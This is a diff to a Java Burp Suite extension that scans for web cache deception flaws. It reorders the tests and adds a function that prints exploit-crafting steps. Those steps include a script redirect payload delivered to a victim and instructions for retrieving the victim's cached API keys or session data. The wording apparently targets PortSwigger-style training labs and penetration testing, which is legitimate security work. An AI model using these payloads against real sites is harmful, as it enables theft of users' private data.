@@ -4,6 +4,7 @@ import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.PrintStream;
+import java.net.URL;
 import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicLong;
@@ -76,7 +77,9 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
 
         helpers = iBurpExtenderCallbacks.getHelpers();
 
-        int parallelism = Math.max(2, Runtime.getRuntime().availableProcessors());
+        // Initialize performance configuration
+        int threadMultiplier = PerformanceConfig.getThreadMultiplier();
+        int parallelism = Math.max(2, Runtime.getRuntime().availableProcessors() * threadMultiplier);
         executor = new ThreadPoolExecutor(
                 parallelism,
                 parallelism,
@@ -85,7 +88,12 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 new LinkedBlockingQueue<>(),
                 new ThreadPoolExecutor.CallerRunsPolicy());
         executor.allowCoreThreadTimeOut(false);
-        logInfo("Version " + VERSION + " loaded with parallelism: " + parallelism);
+        
+        // Log system info and configuration
+        logInfo("Version " + VERSION + " loaded");
+        logInfo(PerformanceConfig.getSystemInfo());
+        logInfo(PerformanceConfig.getConfigSummary());
+        logInfo("Thread pool size: " + parallelism + " threads");
     }
 
 
@@ -217,6 +225,16 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                     }
                 }
 
+                updateStatus("Testing reverse traversal...");
+                // Test reverse traversal early - it's a high-severity test
+                String[] priorityReversePaths = {"/resources/", "/static/", "/assets/"};
+                for (String cachePath : priorityReversePaths) {
+                    if (RequestSender.testReverseTraversal(reqRes, cachePath)) {
+                        successfulReverseTraversals.put(cachePath, "");
+                        break; // Found one, stop
+                    }
+                }
+                
                 updateStatus("Testing hash-based traversal...");
                 String[] traversalPatterns = {
                     "%2f%2e%2e%2f", "%2f..%2f", "%252f%252e%252e%252f", "/%2e%2e/", "%2f%2e%2e"
@@ -235,99 +253,198 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                         }
                     }
                 }
+                
+                // Early exit: If we found high-severity vulnerabilities, skip low-priority tests
+                boolean hasHighSeverityVuln = hashTraversalVulnerable || 
+                                            !successfulSelfRefExploits.isEmpty() || 
+                                            !successfulReverseTraversals.isEmpty();
+                
+                if (hasHighSeverityVuln) {
+                    logInfo("High-severity vulnerabilities found, skipping low-priority tests");
+                    // Continue to results analysis
+                } else {
 
-                updateStatus("Testing delimiter + extensions...");
-                List<String> allExtensions = new ArrayList<>(Arrays.asList(RequestSender.INITIAL_TEST_EXTENSIONS));
-                allExtensions.addAll(Arrays.asList(RequestSender.OTHER_TEST_EXTENSIONS));
-
-                for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
-                    for (String extension : allExtensions) {
-                        if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
-                            vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
-                        }
-                    }
-                }
-                
-                updateStatus("Testing header-based cache key attacks...");
-                for (String header : RequestSender.CACHE_KEY_HEADERS) {
-                    if (RequestSender.testHeaderBasedCacheKey(reqRes, header, "evil.com")) {
-                        successfulHeaderAttacks.put(header, "evil.com");
-                    }
-                }
-                
-                updateStatus("Testing HTTP Parameter Pollution...");
-                IRequestInfo reqInfo = helpers.analyzeRequest(reqRes);
-                List<IParameter> params = reqInfo.getParameters();
-                for (IParameter param : params) {
-                    if (param.getType() == IParameter.PARAM_URL) {
-                        if (RequestSender.testHPPCacheKey(reqRes, param.getName())) {
-                            successfulHPPAttacks.put(param.getName(), "HPP");
-                        }
-                    }
-                }
-                
-                updateStatus("Testing case sensitivity attacks...");
-                for (String delimiter : Arrays.asList("/", ";", "?")) {
-                    for (String ext : Arrays.asList("css", "js", "html")) {
-                        if (RequestSender.testCaseSensitivityAttack(reqRes, delimiter, ext)) {
-                            successfulCaseAttacks.put(delimiter, ext);
-                            break;
-                        }
-                    }
-                }
-                
-                updateStatus("Testing unicode normalization...");
-                for (String delimiter : Arrays.asList("/", ";", "?")) {
-                    if (RequestSender.testUnicodeNormalization(reqRes, delimiter)) {
-                        successfulUnicodeAttacks.put(delimiter, "unicode");
-                    }
-                }
-
-                updateStatus("Testing path normalization...");
-                List<String> knownPaths = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PATHS);
-                List<String> normalizationTemplates = Arrays.asList(RequestSender.NORMALIZATION_TEMPLATES);
-                
-                for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
-                    Map<String, String> successfulPathsForDelimiter = new HashMap<>();
-                    for (String knownPath : knownPaths) {
-                        for (String template : normalizationTemplates) {
-                            if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
-                                successfulPathsForDelimiter.put(knownPath, template);
+                    updateStatus("Testing delimiter + extensions...");
+                    // Prioritize common extensions first, test fewer combinations
+                    List<String> priorityExtensions = Arrays.asList("js", "css", "html", "jpg", "png", "pdf");
+                    List<String> allExtensions = new ArrayList<>(priorityExtensions);
+                    
+                    // Test priority extensions with common delimiters first
+                    String[] commonDelimiters = {"/", ";", "?"};
+                    int foundCount = 0;
+                    final int MAX_FINDINGS_PER_DELIMITER = 2; // Stop after finding 2 per delimiter
+                    
+                    for (String delimiter : commonDelimiters) {
+                        if (foundCount >= 6) break; // Stop if we've found enough total
+                        for (String extension : priorityExtensions) {
+                            if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
+                                vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
+                                foundCount++;
+                                if (vulnerableDelimiterCombinations.get(delimiter).size() >= MAX_FINDINGS_PER_DELIMITER) {
+                                    break; // Found enough for this delimiter
+                                }
                             }
                         }
                     }
-                    if (!successfulPathsForDelimiter.isEmpty()) {
-                        successfulNormalizationDetails.put(delimiter, successfulPathsForDelimiter);
+                    
+                    // Only test other extensions/delimiters if we haven't found anything yet
+                    if (vulnerableDelimiterCombinations.isEmpty()) {
+                        allExtensions.addAll(Arrays.asList(RequestSender.OTHER_TEST_EXTENSIONS));
+                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
+                            if (vulnerableDelimiterCombinations.containsKey(delimiter)) continue; // Skip if already found
+                            for (String extension : allExtensions) {
+                                if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
+                                    vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
+                                    break; // Stop after first find per delimiter
+                                }
+                            }
+                        }
                     }
-                }
-
-                updateStatus("Testing relative normalization...");
-                String specificRelativePath = "%2f%2e%2e%2frobots.txt";
-                for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
-                    if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
-                        successfulRelativeExploits.put(delimiter, specificRelativePath);
+                    
+                    updateStatus("Testing header-based cache key attacks...");
+                    for (String header : RequestSender.CACHE_KEY_HEADERS) {
+                        if (RequestSender.testHeaderBasedCacheKey(reqRes, header, "evil.com")) {
+                            successfulHeaderAttacks.put(header, "evil.com");
+                        }
                     }
-                }
-
-                updateStatus("Testing prefix normalization...");
-                List<String> knownPrefixes = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PREFIXES);
-                for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
-                    for (String prefix : knownPrefixes) {
-                        if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
-                            successfulPrefixExploits.put(delimiter, prefix);
-                            break;
+                    
+                    updateStatus("Testing HTTP Parameter Pollution...");
+                    IRequestInfo reqInfo = helpers.analyzeRequest(reqRes);
+                    List<IParameter> params = reqInfo.getParameters();
+                    for (IParameter param : params) {
+                        if (param.getType() == IParameter.PARAM_URL) {
+                            if (RequestSender.testHPPCacheKey(reqRes, param.getName())) {
+                                successfulHPPAttacks.put(param.getName(), "HPP");
+                            }
+                        }
+                    }
+                    
+                    updateStatus("Testing case sensitivity attacks...");
+                    for (String delimiter : Arrays.asList("/", ";", "?")) {
+                        for (String ext : Arrays.asList("css", "js", "html")) {
+                            if (RequestSender.testCaseSensitivityAttack(reqRes, delimiter, ext)) {
+                                successfulCaseAttacks.put(delimiter, ext);
+                                break;
+                            }
+                        }
+                    }
+                    
+                    updateStatus("Testing unicode normalization...");
+                    for (String delimiter : Arrays.asList("/", ";", "?")) {
+                        if (RequestSender.testUnicodeNormalization(reqRes, delimiter)) {
+                            successfulUnicodeAttacks.put(delimiter, "unicode");
                         }
                     }
                 }
 
-                updateStatus("Testing reverse traversal...");
-                String[] reverseTraversalPaths = {
-                    "/resources/", "/static/", "/assets/", "/css/", "/js/", "/images/", "/public/"
-                };
-                for (String cachePath : reverseTraversalPaths) {
-                    if (RequestSender.testReverseTraversal(reqRes, cachePath)) {
-                        successfulReverseTraversals.put(cachePath, "");
+                // Only run medium/low priority tests if no high-severity vulnerabilities found yet
+                // (hasHighSeverityVuln already checked above, but check again after medium tests)
+                boolean stillNoHighSeverityVuln = hashTraversalVulnerable || 
+                                            !successfulSelfRefExploits.isEmpty() || 
+                                            !successfulReverseTraversals.isEmpty() ||
+                                            !successfulHeaderAttacks.isEmpty();
+                
+                if (!stillNoHighSeverityVuln) {
+                    updateStatus("Testing path normalization...");
+                    // Prioritize common cacheable paths and templates
+                    List<String> priorityPaths = Arrays.asList("/robots.txt", "/favicon.ico", "/", "/index.html");
+                    List<String> priorityTemplates = Arrays.asList("%2f%2e%2e%2f", "..%2f");
+                    String[] commonDelimitersForNorm = {"/", ";", "?"};
+                    
+                    // Test priority combinations first
+                    for (String delimiter : commonDelimitersForNorm) {
+                        Map<String, String> successfulPathsForDelimiter = new HashMap<>();
+                        for (String knownPath : priorityPaths) {
+                            for (String template : priorityTemplates) {
+                                if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
+                                    successfulPathsForDelimiter.put(knownPath, template);
+                                    break; // Found one, move to next path
+                                }
+                            }
+                        }
+                        if (!successfulPathsForDelimiter.isEmpty()) {
+                            successfulNormalizationDetails.put(delimiter, successfulPathsForDelimiter);
+                            break; // Found vulnerability, stop testing other delimiters
+                        }
                     }
+                    
+                    // Only test remaining combinations if nothing found
+                    if (successfulNormalizationDetails.isEmpty()) {
+                        List<String> knownPaths = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PATHS);
+                        List<String> normalizationTemplates = Arrays.asList(RequestSender.NORMALIZATION_TEMPLATES);
+                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
+                            Map<String, String> successfulPathsForDelimiter = new HashMap<>();
+                            for (String knownPath : knownPaths) {
+                                for (String template : normalizationTemplates) {
+                                    if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
+                                        successfulPathsForDelimiter.put(knownPath, template);
+                                        break; // Found one, move to next path
+                                    }
+                                }
+                            }
+                            if (!successfulPathsForDelimiter.isEmpty()) {
+                                successfulNormalizationDetails.put(delimiter, successfulPathsForDelimiter);
+                                break; // Found one, stop
+                            }
+                        }
+                    }
+
+                    updateStatus("Testing relative normalization...");
+                    String specificRelativePath = "%2f%2e%2e%2frobots.txt";
+                    // Test common delimiters first
+                    String[] commonDelimitersForRel = {"/", ";", "?"};
+                    for (String delimiter : commonDelimitersForRel) {
+                        if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
+                            successfulRelativeExploits.put(delimiter, specificRelativePath);
+                            break; // Found one, stop
+                        }
+                    }
+                    
+                    // Only test remaining if nothing found
+                    if (successfulRelativeExploits.isEmpty()) {
+                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
+                            if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
+                                successfulRelativeExploits.put(delimiter, specificRelativePath);
+                                break; // Found one, stop
+                            }
+                        }
+                    }
+
+                    updateStatus("Testing prefix normalization...");
+                    // Prioritize common prefixes
+                    List<String> priorityPrefixes = Arrays.asList("/resources/", "/static/", "/assets/", "/public/");
+                    String[] commonDelimitersForPrefix = {"/", ";", "?"};
+                    
+                    // Test priority combinations first
+                    for (String delimiter : commonDelimitersForPrefix) {
+                        for (String prefix : priorityPrefixes) {
+                            if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
+                                successfulPrefixExploits.put(delimiter, prefix);
+                                break; // Found one, stop testing this delimiter
+                            }
+                        }
+                        if (successfulPrefixExploits.containsKey(delimiter)) {
+                            break; // Found vulnerability, stop testing other delimiters
+                        }
+                    }
+                    
+                    // Only test remaining if nothing found
+                    if (successfulPrefixExploits.isEmpty()) {
+                        List<String> knownPrefixes = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PREFIXES);
+                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
+                            for (String prefix : knownPrefixes) {
+                                if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
+                                    successfulPrefixExploits.put(delimiter, prefix);
+                                    break;
+                                }
+                            }
+                            if (successfulPrefixExploits.containsKey(delimiter)) {
+                                break; // Found one, stop
+                            }
+                        }
+                    }
+                } else {
+                    logInfo("Skipping medium/low priority tests - high-severity vulnerabilities already found");
                 }
 
                 updateStatus("Analyzing results...");
@@ -501,9 +618,98 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
             if (exploitCount > 0) {
                 logInfo(String.format("Found %d exploit(s):", exploitCount));
                 print(summary.toString());
+                
+                // Add exploit crafting instructions
+                String craftingInstructions = generateExploitCraftingInstructions(reqRes, baseUrl, targetPath, targetFilename,
+                        successfulReverseTraversals, successfulSelfRefExploits, hashTraversalVulnerable, successfulTraversalPath);
+                if (craftingInstructions != null && !craftingInstructions.isEmpty()) {
+                    print("\n=== EXPLOIT CRAFTING INSTRUCTIONS ===\n");
+                    print(craftingInstructions);
+                    summary.append("\n\n=== EXPLOIT CRAFTING INSTRUCTIONS ===\n");
+                    summary.append(craftingInstructions);
+                }
             }
 
             return summary.toString();
+        }
+        
+        private String generateExploitCraftingInstructions(IHttpRequestResponse reqRes, String baseUrl, String targetPath,
+                String targetFilename, Map<String, String> successfulReverseTraversals,
+                Map<String, Map<String, String>> successfulSelfRefExploits, boolean hashTraversalVulnerable,
+                String successfulTraversalPath) {
+            
+            StringBuilder instructions = new StringBuilder();
+            String bestExploitUrl = null;
+            String bestExploitType = null;
+            
+            // Prioritize reverse traversal as it's the most common and reliable
+            if (!successfulReverseTraversals.isEmpty()) {
+                String cachePath = successfulReverseTraversals.keySet().iterator().next();
+                bestExploitUrl = baseUrl.replace(targetPath, cachePath + "..%2f" + targetFilename);
+                bestExploitType = "Reverse Traversal";
+            } else if (!successfulSelfRefExploits.isEmpty()) {
+                // Use self-referential normalization
+                Map.Entry<String, Map<String, String>> firstEntry = successfulSelfRefExploits.entrySet().iterator().next();
+                String delimiter = firstEntry.getKey();
+                Map.Entry<String, String> segmentEntry = firstEntry.getValue().entrySet().iterator().next();
+                String exploitPath = segmentEntry.getKey() + segmentEntry.getValue() + targetFilename;
+                bestExploitUrl = baseUrl + delimiter + exploitPath;
+                bestExploitType = "Self-Referential Normalization";
+            } else if (hashTraversalVulnerable && successfulTraversalPath != null) {
+                bestExploitUrl = baseUrl + "%23" + successfulTraversalPath;
+                bestExploitType = "Hash Traversal";
+            }
+            
+            if (bestExploitUrl == null) {
+                return null; // No suitable exploit found
+            }
+            
+            // Extract domain for exploit server
+            try {
+                URL url = new URL(baseUrl);
+                String domain = url.getHost();
+                if (url.getPort() != -1 && url.getPort() != url.getDefaultPort()) {
+                    domain = url.getHost() + ":" + url.getPort();
+                }
+                
+                instructions.append("CRAFT AN EXPLOIT:\n\n");
+                instructions.append("1. Burp Repeater Test:\n");
+                instructions.append("   - Go to the Repeater tab\n");
+                instructions.append("   - Send a GET request to: ").append(bestExploitUrl).append("\n");
+                instructions.append("   - Verify you receive a 200 response with sensitive data\n");
+                instructions.append("   - Check the X-Cache header (should show 'miss' on first request, 'hit' on second)\n\n");
+                
+                instructions.append("2. Exploit Server Payload:\n");
+                instructions.append("   - In Burp's browser, click 'Go to exploit server'\n");
+                instructions.append("   - In the Body section, paste this exploit:\n\n");
+                
+                String exploitPayload = String.format("<script>document.location=\"%s?wcd=\"+Math.random()</script>", 
+                        bestExploitUrl);
+                instructions.append("   ").append(exploitPayload).append("\n\n");
+                
+                instructions.append("   - Click 'Deliver exploit to victim'\n");
+                instructions.append("   - When the victim views the exploit, their response is cached\n\n");
+                
+                instructions.append("3. Retrieve Cached Response:\n");
+                instructions.append("   - Visit the exploit URL in your browser:\n");
+                instructions.append("   ").append(bestExploitUrl).append("?wcd=<random>\n");
+                instructions.append("   - The response should contain the victim's sensitive data (API key, session, etc.)\n");
+                instructions.append("   - Copy the sensitive data from the cached response\n\n");
+                
+                instructions.append("NOTE: The '?wcd=' parameter with a random value acts as a cache buster to ensure\n");
+                instructions.append("      you don't receive your own previously cached response.\n");
+                
+            } catch (Exception e) {
+                // If URL parsing fails, provide simpler instructions
+                instructions.append("CRAFT AN EXPLOIT:\n\n");
+                instructions.append("1. Test the exploit URL in Burp Repeater:\n");
+                instructions.append("   ").append(bestExploitUrl).append("?wcd=<random>\n\n");
+                instructions.append("2. Create an exploit server payload:\n");
+                instructions.append("   <script>document.location=\"").append(bestExploitUrl).append("?wcd=\"+Math.random()</script>\n\n");
+                instructions.append("3. Deliver to victim and retrieve cached response from the exploit URL.\n");
+            }
+            
+            return instructions.toString();
         }
         
         private String extractFilename(String path) {
